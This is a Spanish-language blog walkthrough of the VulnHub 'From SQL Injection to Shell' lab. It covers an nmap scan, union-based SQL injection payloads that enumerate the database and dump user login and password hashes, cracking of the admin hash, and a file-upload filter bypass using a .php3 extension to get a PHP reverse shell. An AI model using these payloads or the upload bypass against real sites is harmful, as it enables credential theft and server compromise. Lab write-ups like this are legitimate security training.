---
title: VulnHub - From SQl Injecion to Shell
published: true
---

---

[From Sql Injection to Shell - lab](@https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/)

## Intrusion

Escaneo con Nmap para descubrir puertos abiertos en la máquina.

```bash
nmap 192.168.1.29
Nmap scan report for 192.168.1.29
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

* 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
* 80/tcp open http Apache httpd 2.2.16 ((Debian))

> El puerto 22 es vulnerable a user enumeration pero, obviamente no es la idea del laboratorio, por lo que seguimos.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled.png)

La web es sencilla y no tiene mucho contenido. 

| Home	| Página principal y muestra la ultima foto que se publico |
| test	| Muestra la foto “ruby” y “cthulhu” |
| ruxcon| Muestra la foto “hacker” |
| 2010	| Sin contenido |
| All pictures	| Muestra todas las fotos |
| Admin	| Panel de autenticación |

> Si en el panel de autenticación ponemos ‘ad’, se muestran algunas opciones. No estoy seguro si esto es a propósito para despistar, pero la SQLi no se da a través de este panel.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled1.png)

Tanto “test” como “ruxcon” y “2010” tienen un parámetro en la URL que filtra por ID.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled2.png)

En este caso, comienzo probando cosas en “test”, que es `id=1`. Si comenzamos a probar cosas en el id, como una comilla simple, nos devuelve un error de SQL y podemos ver el error en la respuesta.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled3.png)

La descripción de la máquina ya nos da una idea de que se trata de una inyección SQL, así que con un `order by 10 -- -` comenzamos a tratar de adivinar el número de columnas que nos devuelve la consulta. 

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled4.png)

Dice “_Unknown_ _column_ ‘10’ _in_ _‘order_ _clause’_” esto es buena señal para seguir probando hasta que coincida con el número de columnas y que la respuesta ya no dé error.

Seguí probando hasta llegar al 4 y la respuesta ya no dio error, por lo que pudimos determinar el número de columnas y ahora con un “union select”, podemos comenzar a combinar datos de otras tablas.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled5.png)

Al aplicar el “UNION” attack, podemos ver el número 2 representado en la web, por lo que en ese campo podríamos empezar a sacar información. Podemos probar ver el usuario con `union select 1,user(),3,4-- -` , saber la versión de la base de datos `union select 1,version(),3,4-- -` o saber la base de datos en uso `union select 1,database(),3,4-- -`.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled6.png)

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled7.png)

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled8.png)

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled9.png)

Enumeramos las bases de datos existentes.

```sql
1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
```

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled10.png)

Como habíamos visto antes, existen “photoblog” e “information_schema”.

Enumeramos las tablas existentes en la base de datos “photoblog”.

```sql
1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema="photoblog"-- -
```

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled11.png)

Vamos a ver las columnas de la tabla “users”.

```sql
1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema="photoblog" and table_name="users"-- -
```

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled12.png)

Sabiendo los nombres de las columnas podríamos extraer toda la información con la siguiente consulta.

```sql
1 union select 1,group_concat(login,':',password),3,4 from photoblog.users-- -
```

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled13.png)

Pasamos el hash por CrackStation y obtenemos la contraseña del administrador.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled14.png)

Ingresamos y tenemos un panel para agregar o quitar fotos. 

La idea ahora es poder ejecutar comandos en la máquina. 

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled15.png)

Si intentamos subir una reverse shell, sale un mensaje que no admite archivos PHP.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled16.png)

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled17.png)

Probando distintas extensiones como “_php-reverse-shell.**php2**_" o “_php-reverse-shell.**php.jpg**_" ,no funcionaban hasta que probé _**.php3**_ y sí se ejecutó el código, dándome una shell, y a partir de ahí ya podía ejecutar comandos en el sistema.

![](https://eidd3.github.io/assets/img/FromSQLInjectiontoShell/Untitled18.png)



